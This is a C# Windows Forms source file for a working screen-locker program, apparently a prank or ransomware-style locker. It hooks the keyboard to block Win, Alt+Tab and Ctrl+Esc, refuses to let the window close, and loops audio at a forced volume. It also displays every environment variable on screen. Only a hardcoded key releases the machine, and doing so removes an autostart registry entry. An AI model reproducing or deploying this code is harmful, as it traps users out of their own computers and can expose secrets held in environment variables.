using System;
using System.Media;
using System.Diagnostics;
using System.Management;
using System.Windows.Forms;
using System.Collections;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using AudioSwitcher.AudioApi.CoreAudio;
//using System.Speech.Synthesis;

namespace JurassicExp
{
    public partial class Form2 : Form
    {
        /* Code to Disable WinKey, Alt+Tab, Ctrl+Esc Starts Here */

        // Structure contain information about low-level keyboard input event 
        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public Keys key;
            public int scanCode;
            public int flags;
            public int time;
            public IntPtr extra;
        }
        //System level functions to be used for hook and unhook keyboard input  
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hook);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string name);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern short GetAsyncKeyState(Keys key);
        //Declaring Global objects     
        private IntPtr ptrHook;
        private LowLevelKeyboardProc objKeyboardProcess;

        private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
        {
            if (nCode >= 0)
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));

                // Disabling Windows keys 

                if (objKeyInfo.key == Keys.Escape && HasAltModifier(objKeyInfo.flags) || objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin || objKeyInfo.key == Keys.Tab && HasAltModifier(objKeyInfo.flags) || objKeyInfo.key == Keys.Escape && (ModifierKeys & Keys.Control) == Keys.Control)
                {
                    return (IntPtr)1; // if 0 is returned then All the above keys will be enabled
                }
            }
            return CallNextHookEx(ptrHook, nCode, wp, lp);
        }

        bool HasAltModifier(int flags)
        {
            return (flags & 0x20) == 0x20;
        }

        /* Code to Disable WinKey, Alt+Tab, Ctrl+Esc Ends Here */


        public Form2()
        {
            //ProcessStartInfo sInfo = new ProcessStartInfo("https://www.youtube.com/watch?v=RfiQYRn7fBg");
            //Process.Start(sInfo);
            Cursor.Current = Cursors.WaitCursor;
            CoreAudioDevice defaultPlaybackDevice = new CoreAudioController().DefaultPlaybackDevice;
            defaultPlaybackDevice.Volume = 20;

            Application.UseWaitCursor = true;
            //System.Threading.Thread.Sleep(2500);
            SoundPlayer audio = new SoundPlayer(JurassicExp.Properties.Resources.word); // here WindowsFormsApplication1 is the namespace and Connect is the audio file name
            audio.PlayLooping();
            InitializeComponent();
            label2.Text = Environment.OSVersion.ToString();

            foreach (DictionaryEntry e in System.Environment.GetEnvironmentVariables())
            {
                label2.Text = label2.Text + e.Key + ":" + e.Value + Environment.NewLine;
            }

        }

        private void Form2_Load(object sender, EventArgs e)
        {
            KeyboardHook(this, e);
            ProcessModule objCurrentModule = Process.GetCurrentProcess().MainModule;
            objKeyboardProcess = new LowLevelKeyboardProc(captureKey);
            ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(objCurrentModule.ModuleName), 0);
        }
        private void KeyboardHook(Form2 form2, EventArgs e)
        {
            /*
            for (int i = 1; i > 0; i++)
            {
                using (SpeechSynthesizer synth = new SpeechSynthesizer())
                {
                    synth.Speak("Your screen is locked. You cannot get out");
                }
            }
            */
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            Application.UseWaitCursor = false;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string key = "fewdpew";
            TextBox textBox = textBox1;
            if (textBox != null)
            {
                if (textBox.Text == key)
                {
                    RegisterInStartup(false);
                    Process.Start(System.IO.Path.Combine(Environment.GetEnvironmentVariable("windir"), "explorer.exe"));
                    MessageBox.Show("Auto Start Disabled!");
                    Application.Exit();
                }
                else
                {
                    Application.UseWaitCursor = true;
                    string text = "Nice try. But that's not the correct key :(";
                    MessageBox.Show(text);
                }
            }
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            switch (e.CloseReason)
            {
                case CloseReason.UserClosing:
                    e.Cancel = true;
                    break;
            }

            base.OnFormClosing(e);
        }

        private void RegisterInStartup(bool isChecked)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
                    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (isChecked)
            {
                registryKey.SetValue("JurassicTerm", Application.ExecutablePath);
            }
            else
            {
                registryKey.DeleteValue("JurassicTerm");
            }
        }

    }

}
